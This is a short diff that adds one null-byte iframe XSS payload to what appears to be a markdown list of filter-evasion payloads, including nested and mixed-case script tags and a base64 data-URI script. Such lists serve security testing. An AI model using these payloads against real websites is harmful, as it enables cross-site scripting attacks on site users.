@@ -123,4 +123,5 @@
 - <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
 - <sCR<script>iPt>alert(1)</SCr</script>IPt>
 - <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+- <iframe %00 src=\"javascript:prompt(1)\"%00>
 ```
